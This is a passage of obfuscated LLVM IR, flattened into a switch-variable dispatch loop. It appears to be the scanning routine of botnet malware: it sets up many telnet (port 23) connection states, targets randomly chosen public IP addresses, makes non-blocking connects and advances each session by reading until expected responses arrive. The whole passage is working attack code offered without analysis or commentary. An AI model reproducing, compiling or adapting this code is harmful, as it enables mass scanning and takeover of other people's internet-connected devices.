  %.reload19 = load volatile i32, i32* %.reg2mem18
  %29 = icmp sgt i32 %.reload, %.reload19
  %30 = select i1 %29, i32 1268815577, i32 1879365158
  store i32 %30, i32* %switchVar
  br label %loopEnd

; <label>:31:                                     ; preds = %loopEntry
  %32 = load i32, i32* %4, align 4
  store i32 %32, i32* %5, align 4
  store i32 1879365158, i32* %switchVar
  br label %loopEnd

; <label>:33:                                     ; preds = %loopEntry
  %34 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 0
  store i16 2, i16* %34, align 4
  %35 = call zeroext i16 @htons(i16 zeroext 23) #10
  %36 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 1
  store i16 %35, i16* %36, align 2
  %37 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 3
  %38 = getelementptr inbounds [8 x i8], [8 x i8]* %37, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %38, i8 0, i64 8, i32 4, i1 false)
  %39 = call noalias i8* @malloc(i64 1025) #5
  store i8* %39, i8** %17, align 8
  %40 = load i8*, i8** %17, align 8
  call void @llvm.memset.p0i8.i64(i8* %40, i8 0, i64 1025, i32 1, i1 false)
  %41 = load i32, i32* %5, align 4
  %42 = zext i32 %41 to i64
  %43 = call i8* @llvm.stacksave()
  store i8* %43, i8** %19, align 8
  %44 = alloca %struct.telstate_t, i64 %42, align 16
  store %struct.telstate_t* %44, %struct.telstate_t** %.reg2mem20
  %.reload137 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %45 = bitcast %struct.telstate_t* %.reload137 to i8*
  %46 = load i32, i32* %5, align 4
  %47 = sext i32 %46 to i64
  %48 = mul i64 %47, 5
  call void @llvm.memset.p0i8.i64(i8* %45, i8 0, i64 %48, i32 16, i1 false)
  store i32 0, i32* %6, align 4
  store i32 -868841946, i32* %switchVar
  br label %loopEnd

; <label>:49:                                     ; preds = %loopEntry
  %50 = load i32, i32* %6, align 4
  %51 = load i32, i32* %5, align 4
  %52 = icmp slt i32 %50, %51
  %53 = select i1 %52, i32 1577477531, i32 300706276
  store i32 %53, i32* %switchVar
  br label %loopEnd

; <label>:54:                                     ; preds = %loopEntry
  %55 = load i32, i32* %6, align 4
  %56 = sext i32 %55 to i64
  %.reload136 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %57 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload136, i64 %56
  %58 = bitcast %struct.telstate_t* %57 to i8*
  call void @llvm.memset.p0i8.i64(i8* %58, i8 0, i64 32, i32 16, i1 false)
  %59 = load i32, i32* %6, align 4
  %60 = sext i32 %59 to i64
  %.reload135 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %61 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload135, i64 %60
  %62 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %61, i32 0, i32 3
  store i8 1, i8* %62, align 1
  %63 = load i8*, i8** %17, align 8
  %64 = load i32, i32* %6, align 4
  %65 = sext i32 %64 to i64
  %.reload134 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %66 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload134, i64 %65
  %67 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %66, i32 0, i32 9
  store i8* %63, i8** %67, align 8
  store i32 67734208, i32* %switchVar
  br label %loopEnd

; <label>:68:                                     ; preds = %loopEntry
  %69 = load i32, i32* %6, align 4
  %70 = add nsw i32 %69, 1
  store i32 %70, i32* %6, align 4
  store i32 -868841946, i32* %switchVar
  br label %loopEnd

; <label>:71:                                     ; preds = %loopEntry
  store i32 -150514707, i32* %switchVar
  br label %loopEnd

; <label>:72:                                     ; preds = %loopEntry
  store i32 1844271184, i32* %switchVar
  br label %loopEnd

; <label>:73:                                     ; preds = %loopEntry
  store i32 0, i32* %6, align 4
  store i32 1847016220, i32* %switchVar
  br label %loopEnd

; <label>:74:                                     ; preds = %loopEntry
  %75 = load i32, i32* %6, align 4
  %76 = load i32, i32* %5, align 4
  %77 = icmp slt i32 %75, %76
  %78 = select i1 %77, i32 54377381, i32 1204835284
  store i32 %78, i32* %switchVar
  br label %loopEnd

; <label>:79:                                     ; preds = %loopEntry
  %80 = load i32, i32* %6, align 4
  %81 = sext i32 %80 to i64
  %.reload133 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %82 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload133, i64 %81
  %83 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %82, i32 0, i32 7
  %84 = load i32, i32* %83, align 16
  %85 = icmp eq i32 %84, 0
  %86 = select i1 %85, i32 1658938026, i32 563386705
  store i32 %86, i32* %switchVar
  br label %loopEnd

; <label>:87:                                     ; preds = %loopEntry
  %88 = call i64 @time(i64* null) #5
  %89 = trunc i64 %88 to i32
  %90 = load i32, i32* %6, align 4
  %91 = sext i32 %90 to i64
  %.reload132 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %92 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload132, i64 %91
  %93 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %92, i32 0, i32 7
  store i32 %89, i32* %93, align 16
  store i32 563386705, i32* %switchVar
  br label %loopEnd

; <label>:94:                                     ; preds = %loopEntry
  %95 = load i32, i32* %6, align 4
  %96 = sext i32 %95 to i64
  %.reload131 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %97 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload131, i64 %96
  %98 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %97, i32 0, i32 2
  %99 = load i8, i8* %98, align 8
  %100 = zext i8 %99 to i32
  store i32 %100, i32* %.reg2mem138
  store i32 1673681324, i32* %switchVar
  br label %loopEnd

NodeBlock15:                                      ; preds = %loopEntry
  %.reload148 = load volatile i32, i32* %.reg2mem138
  %Pivot16 = icmp slt i32 %.reload148, 4
  %101 = select i1 %Pivot16, i32 220787894, i32 1242133823
  store i32 %101, i32* %switchVar
  br label %loopEnd

NodeBlock13:                                      ; preds = %loopEntry
  %.reload143 = load volatile i32, i32* %.reg2mem138
  %Pivot14 = icmp slt i32 %.reload143, 6
  %102 = select i1 %Pivot14, i32 -1314589508, i32 1840688043
  store i32 %102, i32* %switchVar
  br label %loopEnd

NodeBlock11:                                      ; preds = %loopEntry
  %.reload141 = load volatile i32, i32* %.reg2mem138
  %Pivot12 = icmp slt i32 %.reload141, 7
  %103 = select i1 %Pivot12, i32 -229129173, i32 934221455
  store i32 %103, i32* %switchVar
  br label %loopEnd

NodeBlock9:                                       ; preds = %loopEntry
  %.reload140 = load volatile i32, i32* %.reg2mem138
  %Pivot10 = icmp slt i32 %.reload140, 8
  %104 = select i1 %Pivot10, i32 2035229503, i32 1903913161
  store i32 %104, i32* %switchVar
  br label %loopEnd

LeafBlock7:                                       ; preds = %loopEntry
  %.reload139 = load volatile i32, i32* %.reg2mem138
  %SwitchLeaf8 = icmp eq i32 %.reload139, 8
  %105 = select i1 %SwitchLeaf8, i32 -2090721774, i32 2113152832
  store i32 %105, i32* %switchVar
  br label %loopEnd

NodeBlock5:                                       ; preds = %loopEntry
  %.reload142 = load volatile i32, i32* %.reg2mem138
  %Pivot6 = icmp slt i32 %.reload142, 5
  %106 = select i1 %Pivot6, i32 1953137853, i32 -1993409231
  store i32 %106, i32* %switchVar
  br label %loopEnd

NodeBlock3:                                       ; preds = %loopEntry
  %.reload147 = load volatile i32, i32* %.reg2mem138
  %Pivot4 = icmp slt i32 %.reload147, 2
  %107 = select i1 %Pivot4, i32 1683881422, i32 1020078040
  store i32 %107, i32* %switchVar
  br label %loopEnd

NodeBlock1:                                       ; preds = %loopEntry
  %.reload144 = load volatile i32, i32* %.reg2mem138
  %Pivot2 = icmp slt i32 %.reload144, 3
  %108 = select i1 %Pivot2, i32 -1804144683, i32 -1126487820
  store i32 %108, i32* %switchVar
  br label %loopEnd

NodeBlock:                                        ; preds = %loopEntry
  %.reload146 = load volatile i32, i32* %.reg2mem138
  %Pivot = icmp slt i32 %.reload146, 1
  %109 = select i1 %Pivot, i32 -1334814984, i32 1452039364
  store i32 %109, i32* %switchVar
  br label %loopEnd

LeafBlock:                                        ; preds = %loopEntry
  %.reload145 = load volatile i32, i32* %.reg2mem138
  %SwitchLeaf = icmp eq i32 %.reload145, 0
  %110 = select i1 %SwitchLeaf, i32 876700100, i32 2113152832
  store i32 %110, i32* %switchVar
  br label %loopEnd

; <label>:111:                                    ; preds = %loopEntry
  %112 = load i32, i32* %6, align 4
  %113 = sext i32 %112 to i64
  %.reload130 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %114 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload130, i64 %113
  %115 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %114, i32 0, i32 3
  %116 = load i8, i8* %115, align 1
  %117 = zext i8 %116 to i32
  %118 = icmp eq i32 %117, 1
  %119 = select i1 %118, i32 1887578959, i32 -1684042464
  store i32 %119, i32* %switchVar
  br label %loopEnd

; <label>:120:                                    ; preds = %loopEntry
  %121 = load i32, i32* %6, align 4
  %122 = sext i32 %121 to i64
  %.reload129 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %123 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload129, i64 %122
  %124 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %123, i32 0, i32 9
  %125 = load i8*, i8** %124, align 8
  store i8* %125, i8** %20, align 8
  %126 = load i32, i32* %6, align 4
  %127 = sext i32 %126 to i64
  %.reload128 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %128 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload128, i64 %127
  %129 = bitcast %struct.telstate_t* %128 to i8*
  call void @llvm.memset.p0i8.i64(i8* %129, i8 0, i64 32, i32 16, i1 false)
  %130 = load i8*, i8** %20, align 8
  %131 = load i32, i32* %6, align 4
  %132 = sext i32 %131 to i64
  %.reload127 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %133 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload127, i64 %132
  %134 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %133, i32 0, i32 9
  store i8* %130, i8** %134, align 8
  %135 = call i32 @getRandomPublicIP()
  %136 = load i32, i32* %6, align 4
  %137 = sext i32 %136 to i64
  %.reload126 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %138 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload126, i64 %137
  %139 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %138, i32 0, i32 1
  store i32 %135, i32* %139, align 4
  store i32 655837451, i32* %switchVar
  br label %loopEnd

; <label>:140:                                    ; preds = %loopEntry
  %141 = load i32, i32* %6, align 4
  %142 = sext i32 %141 to i64
  %.reload125 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %143 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload125, i64 %142
  %144 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %143, i32 0, i32 3
  %145 = load i8, i8* %144, align 1
  %146 = zext i8 %145 to i32
  %147 = icmp eq i32 %146, 0
  %148 = select i1 %147, i32 722636225, i32 -379042933
  store i32 %148, i32* %switchVar
  br label %loopEnd

; <label>:149:                                    ; preds = %loopEntry
  %150 = load i32, i32* %6, align 4
  %151 = sext i32 %150 to i64
  %.reload124 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %152 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload124, i64 %151
  %153 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %152, i32 0, i32 4
  %154 = load i8, i8* %153, align 2
  %155 = add i8 %154, 1
  store i8 %155, i8* %153, align 2
  %156 = load i32, i32* %6, align 4
  %157 = sext i32 %156 to i64
  %.reload123 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %158 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload123, i64 %157
  %159 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %158, i32 0, i32 5
  %160 = load i8, i8* %159, align 1
  %161 = add i8 %160, 1
  store i8 %161, i8* %159, align 1
  %162 = load i32, i32* %6, align 4
  %163 = sext i32 %162 to i64
  %.reload122 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %164 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload122, i64 %163
  %165 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %164, i32 0, i32 5
  %166 = load i8, i8* %165, align 1
  %167 = zext i8 %166 to i64
  %168 = icmp eq i64 %167, 19
  %169 = select i1 %168, i32 -1468988545, i32 -895961323
  store i32 %169, i32* %switchVar
  br label %loopEnd

; <label>:170:                                    ; preds = %loopEntry
  %171 = load i32, i32* %6, align 4
  %172 = sext i32 %171 to i64
  %.reload121 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %173 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload121, i64 %172
  %174 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %173, i32 0, i32 3
  store i8 1, i8* %174, align 1
  store i32 -854067751, i32* %switchVar
  br label %loopEnd

; <label>:175:                                    ; preds = %loopEntry
  %176 = load i32, i32* %6, align 4
  %177 = sext i32 %176 to i64
  %.reload120 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %178 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload120, i64 %177
  %179 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %178, i32 0, i32 4
  %180 = load i8, i8* %179, align 2
  %181 = zext i8 %180 to i64
  %182 = icmp eq i64 %181, 19
  %183 = select i1 %182, i32 232752200, i32 -1120220925
  store i32 %183, i32* %switchVar
  br label %loopEnd

; <label>:184:                                    ; preds = %loopEntry
  %185 = load i32, i32* %6, align 4
  %186 = sext i32 %185 to i64
  %.reload119 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %187 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload119, i64 %186
  %188 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %187, i32 0, i32 3
  store i8 1, i8* %188, align 1
  store i32 -854067751, i32* %switchVar
  br label %loopEnd

; <label>:189:                                    ; preds = %loopEntry
  store i32 -379042933, i32* %switchVar
  br label %loopEnd

; <label>:190:                                    ; preds = %loopEntry
  store i32 655837451, i32* %switchVar
  br label %loopEnd

; <label>:191:                                    ; preds = %loopEntry
  %192 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 0
  store i16 2, i16* %192, align 4
  %193 = call zeroext i16 @htons(i16 zeroext 23) #10
  %194 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 1
  store i16 %193, i16* %194, align 2
  %195 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 3
  %196 = getelementptr inbounds [8 x i8], [8 x i8]* %195, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %196, i8 0, i64 8, i32 4, i1 false)
  %197 = load i32, i32* %6, align 4
  %198 = sext i32 %197 to i64
  %.reload118 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %199 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload118, i64 %198
  %200 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %199, i32 0, i32 1
  %201 = load i32, i32* %200, align 4
  %202 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 2
  %203 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %202, i32 0, i32 0
  store i32 %201, i32* %203, align 4
  %204 = call i32 @socket(i32 2, i32 1, i32 0) #5
  %205 = load i32, i32* %6, align 4
  %206 = sext i32 %205 to i64
  %.reload117 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %207 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload117, i64 %206
  %208 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %207, i32 0, i32 0
  store i32 %204, i32* %208, align 16
  %209 = load i32, i32* %6, align 4
  %210 = sext i32 %209 to i64
  %.reload116 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %211 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload116, i64 %210
  %212 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %211, i32 0, i32 0
  %213 = load i32, i32* %212, align 16
  %214 = icmp eq i32 %213, -1
  %215 = select i1 %214, i32 -6618673, i32 924843398
  store i32 %215, i32* %switchVar
  br label %loopEnd

; <label>:216:                                    ; preds = %loopEntry
  store i32 -854067751, i32* %switchVar
  br label %loopEnd

; <label>:217:                                    ; preds = %loopEntry
  %218 = load i32, i32* %6, align 4
  %219 = sext i32 %218 to i64
  %.reload115 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %220 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload115, i64 %219
  %221 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %220, i32 0, i32 0
  %222 = load i32, i32* %221, align 16
  %223 = load i32, i32* %6, align 4
  %224 = sext i32 %223 to i64
  %.reload114 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %225 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload114, i64 %224
  %226 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %225, i32 0, i32 0
  %227 = load i32, i32* %226, align 16
  %228 = call i32 (i32, i32, ...) @fcntl(i32 %227, i32 3, i8* null)
  %229 = or i32 %228, 2048
  %230 = call i32 (i32, i32, ...) @fcntl(i32 %222, i32 4, i32 %229)
  %231 = load i32, i32* %6, align 4
  %232 = sext i32 %231 to i64
  %.reload113 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %233 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload113, i64 %232
  %234 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %233, i32 0, i32 0
  %235 = load i32, i32* %234, align 16
  %236 = bitcast %struct.sockaddr_in* %18 to %struct.sockaddr*
  %237 = call i32 @connect(i32 %235, %struct.sockaddr* %236, i32 16)
  %238 = icmp eq i32 %237, -1
  %239 = select i1 %238, i32 -1526372519, i32 -2107535376
  store i32 %239, i32* %switchVar
  br label %loopEnd

; <label>:240:                                    ; preds = %loopEntry
  %241 = call i32* @__errno_location() #10
  %242 = load i32, i32* %241, align 4
  %243 = icmp ne i32 %242, 115
  %244 = select i1 %243, i32 -219208848, i32 -2107535376
  store i32 %244, i32* %switchVar
  br label %loopEnd

; <label>:245:                                    ; preds = %loopEntry
  %246 = load i32, i32* %6, align 4
  %247 = sext i32 %246 to i64
  %.reload112 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %248 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload112, i64 %247
  call void @reset_telstate(%struct.telstate_t* %248)
  store i32 645889333, i32* %switchVar
  br label %loopEnd

; <label>:249:                                    ; preds = %loopEntry
  %250 = load i32, i32* %6, align 4
  %251 = sext i32 %250 to i64
  %.reload111 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %252 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload111, i64 %251
  call void @advance_telstate(%struct.telstate_t* %252, i32 1)
  store i32 645889333, i32* %switchVar
  br label %loopEnd

; <label>:253:                                    ; preds = %loopEntry
  store i32 1015336728, i32* %switchVar
  br label %loopEnd

; <label>:254:                                    ; preds = %loopEntry
  store i32 1341604381, i32* %switchVar
  br label %loopEnd

; <label>:255:                                    ; preds = %loopEntry
  %256 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %12, i32 0, i32 0
  %257 = getelementptr inbounds [16 x i64], [16 x i64]* %256, i64 0, i64 0
  %258 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %257) #5, !srcloc !5
  %259 = extractvalue { i64, i64* } %258, 0
  %260 = extractvalue { i64, i64* } %258, 1
  %261 = trunc i64 %259 to i32
  store i32 %261, i32* %21, align 4
  %262 = ptrtoint i64* %260 to i64
  %263 = trunc i64 %262 to i32
  store i32 %263, i32* %22, align 4
  store i32 675480794, i32* %switchVar
  br label %loopEnd

; <label>:264:                                    ; preds = %loopEntry
  store i32 883621267, i32* %switchVar
  br label %loopEnd

; <label>:265:                                    ; preds = %loopEntry
  %266 = load i32, i32* %6, align 4
  %267 = sext i32 %266 to i64
  %.reload110 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %268 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload110, i64 %267
  %269 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %268, i32 0, i32 0
  %270 = load i32, i32* %269, align 16
  %271 = srem i32 %270, 64
  %272 = zext i32 %271 to i64
  %273 = shl i64 1, %272
  %274 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %12, i32 0, i32 0
  %275 = load i32, i32* %6, align 4
  %276 = sext i32 %275 to i64
  %.reload109 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %277 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload109, i64 %276
  %278 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %277, i32 0, i32 0
  %279 = load i32, i32* %278, align 16
  %280 = sdiv i32 %279, 64
  %281 = sext i32 %280 to i64
  %282 = getelementptr inbounds [16 x i64], [16 x i64]* %274, i64 0, i64 %281
  %283 = load i64, i64* %282, align 8
  %284 = or i64 %283, %273
  store i64 %284, i64* %282, align 8
  %285 = getelementptr inbounds %struct.timeval, %struct.timeval* %13, i32 0, i32 0
  store i64 0, i64* %285, align 8
  %286 = load i32, i32* %3, align 4
  %287 = sext i32 %286 to i64
  %288 = getelementptr inbounds %struct.timeval, %struct.timeval* %13, i32 0, i32 1
  store i64 %287, i64* %288, align 8
  %289 = load i32, i32* %6, align 4
  %290 = sext i32 %289 to i64
  %.reload108 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %291 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload108, i64 %290
  %292 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %291, i32 0, i32 0
  %293 = load i32, i32* %292, align 16
  %294 = add nsw i32 %293, 1
  %295 = call i32 @select(i32 %294, %struct.fd_set* null, %struct.fd_set* %12, %struct.fd_set* null, %struct.timeval* %13)
  store i32 %295, i32* %7, align 4
  %296 = load i32, i32* %7, align 4
  %297 = icmp eq i32 %296, 1
  %298 = select i1 %297, i32 -416109397, i32 -798317049
  store i32 %298, i32* %switchVar
  br label %loopEnd

; <label>:299:                                    ; preds = %loopEntry
  %300 = load i32, i32* %6, align 4
  %301 = sext i32 %300 to i64
  %.reload107 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %302 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload107, i64 %301
  %303 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %302, i32 0, i32 7
  store i32 0, i32* %303, align 16
  store i32 4, i32* %14, align 4
  store i32 0, i32* %15, align 4
  %304 = load i32, i32* %6, align 4
  %305 = sext i32 %304 to i64
  %.reload106 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %306 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload106, i64 %305
  %307 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %306, i32 0, i32 0
  %308 = load i32, i32* %307, align 16
  %309 = bitcast i32* %15 to i8*
  %310 = call i32 @getsockopt(i32 %308, i32 1, i32 4, i8* %309, i32* %14) #5
  %311 = load i32, i32* %15, align 4
  %312 = icmp ne i32 %311, 0
  %313 = select i1 %312, i32 -287908340, i32 1943163349
  store i32 %313, i32* %switchVar
  br label %loopEnd

; <label>:314:                                    ; preds = %loopEntry
  %315 = load i32, i32* %6, align 4
  %316 = sext i32 %315 to i64
  %.reload105 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %317 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload105, i64 %316
  call void @reset_telstate(%struct.telstate_t* %317)
  store i32 1214024859, i32* %switchVar
  br label %loopEnd

; <label>:318:                                    ; preds = %loopEntry
  %319 = load i32, i32* %6, align 4
  %320 = sext i32 %319 to i64
  %.reload104 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %321 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload104, i64 %320
  %322 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %321, i32 0, i32 0
  %323 = load i32, i32* %322, align 16
  %324 = load i32, i32* %6, align 4
  %325 = sext i32 %324 to i64
  %.reload103 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %326 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload103, i64 %325
  %327 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %326, i32 0, i32 0
  %328 = load i32, i32* %327, align 16
  %329 = call i32 (i32, i32, ...) @fcntl(i32 %328, i32 3, i8* null)
  %330 = and i32 %329, -2049
  %331 = call i32 (i32, i32, ...) @fcntl(i32 %323, i32 4, i32 %330)
  %332 = load i32, i32* %6, align 4
  %333 = sext i32 %332 to i64
  %.reload102 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %334 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload102, i64 %333
  call void @advance_telstate(%struct.telstate_t* %334, i32 2)
  store i32 1214024859, i32* %switchVar
  br label %loopEnd

; <label>:335:                                    ; preds = %loopEntry
  store i32 -854067751, i32* %switchVar
  br label %loopEnd

; <label>:336:                                    ; preds = %loopEntry
  %337 = load i32, i32* %7, align 4
  %338 = icmp eq i32 %337, -1
  %339 = select i1 %338, i32 -2070728837, i32 1211046979
  store i32 %339, i32* %switchVar
  br label %loopEnd

; <label>:340:                                    ; preds = %loopEntry
  %341 = load i32, i32* %6, align 4
  %342 = sext i32 %341 to i64
  %.reload101 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %343 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload101, i64 %342
  call void @reset_telstate(%struct.telstate_t* %343)
  store i32 -854067751, i32* %switchVar
  br label %loopEnd

; <label>:344:                                    ; preds = %loopEntry
  store i32 -108756672, i32* %switchVar
  br label %loopEnd

; <label>:345:                                    ; preds = %loopEntry
  %346 = load i32, i32* %6, align 4
  %347 = sext i32 %346 to i64
  %.reload100 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %348 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload100, i64 %347
  %349 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %348, i32 0, i32 7
  %350 = load i32, i32* %349, align 16
  %351 = add i32 %350, 7
  %352 = zext i32 %351 to i64
  %353 = call i64 @time(i64* null) #5
  %354 = icmp slt i64 %352, %353
  %355 = select i1 %354, i32 140246675, i32 42623743
  store i32 %355, i32* %switchVar
  br label %loopEnd

; <label>:356:                                    ; preds = %loopEntry
  %357 = load i32, i32* %6, align 4
  %358 = sext i32 %357 to i64
  %.reload99 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %359 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload99, i64 %358
  call void @reset_telstate(%struct.telstate_t* %359)
  store i32 42623743, i32* %switchVar
  br label %loopEnd

; <label>:360:                                    ; preds = %loopEntry
  store i32 1015336728, i32* %switchVar
  br label %loopEnd

; <label>:361:                                    ; preds = %loopEntry
  %362 = load i32, i32* %6, align 4
  %363 = sext i32 %362 to i64
  %.reload98 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %364 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload98, i64 %363
  %365 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %364, i32 0, i32 0
  %366 = load i32, i32* %365, align 16
  %367 = load i32, i32* %3, align 4
  %368 = load i32, i32* %6, align 4
  %369 = sext i32 %368 to i64
  %.reload97 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %370 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload97, i64 %369
  %371 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %370, i32 0, i32 9
  %372 = load i8*, i8** %371, align 8
  %373 = call i32 @read_until_response(i32 %366, i32 %367, i8* %372, i32 1024, i8** getelementptr inbounds ([16 x i8*], [16 x i8*]* @advances, i32 0, i32 0))
  %374 = icmp ne i32 %373, 0
  %375 = select i1 %374, i32 78851137, i32 -74078779
  store i32 %375, i32* %switchVar
  br label %loopEnd

; <label>:376:                                    ; preds = %loopEntry
  %377 = call i64 @time(i64* null) #5
  %378 = trunc i64 %377 to i32
  %379 = load i32, i32* %6, align 4
  %380 = sext i32 %379 to i64
  %.reload96 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %381 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload96, i64 %380
